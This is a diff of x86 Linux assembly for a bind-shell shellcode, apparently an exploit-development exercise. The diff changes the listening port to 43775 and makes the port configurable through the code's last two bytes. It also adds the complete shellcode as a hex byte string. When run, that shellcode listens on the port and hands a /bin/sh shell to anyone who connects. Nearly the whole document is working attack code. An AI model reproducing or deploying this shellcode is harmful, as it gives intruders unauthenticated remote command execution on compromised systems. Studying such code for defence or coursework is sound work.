@@ -3,11 +3,13 @@
 ; 2013 March
 ;
 ; DESC:
-; Binds to a port 12345
+; Binds to a port 43775
 ; Execs Shell on incoming connection
 ;
-; TODO:
-; 1. Port number should be easily configurable;
+;
+; Shellcode "\x31\xc0\xb0\x66\x31\xdb\x43\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xeb\x50\x5f\x6a\x66\x58\x43\x31\xd2\x52\x66\xff\x37\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\xe8\xab\xff\xff\xff\xaa\xff"
+;
+; Port is the last two bytes of the shellcode. In hex \xaa\xff  (0xaaff = 43775)
 ;
 ;
 
@@ -27,12 +29,17 @@ _start:
 	int 0x80
 	mov esi, eax		; save socket fd in ESI for later
 
+
+	jmp short call_get_port
+port_in_esp:
+	pop edi			; getting port address from ESP
+
 	push BYTE 102
 	pop eax			; socketcall
 	inc ebx			; 2 = SYS_BIND bind()
 	xor edx, edx
 	push edx		; 0 = ANY HOST (0.0.0.0)}		||		struct in_addr sin_addr (unsigned long s_addr) };
-	push WORD 0x3930	; PORT 12345 (reverse),			||	 	unsigned short sin_port,
+	push WORD [edi]		; PORT specified in the bottom of the code / shellcode. Last two bytes in HEX.
 	push WORD bx		; 2 = AF_INET				|| struct sockaddr { short sin_family,
 	mov ecx, esp		; Save PTR to sockaddr struct in ECX
 	push BYTE 16		; 	socklen_t addrlen);
@@ -84,4 +91,8 @@ dup2_loop:
 	mov ecx, esp
 	mov al, 11		; execve
 	int 0x80
+
+call_get_port:
+	call port_in_esp
+	db 0xaa, 0xff		; BYTE (43775 in straight hex)
 
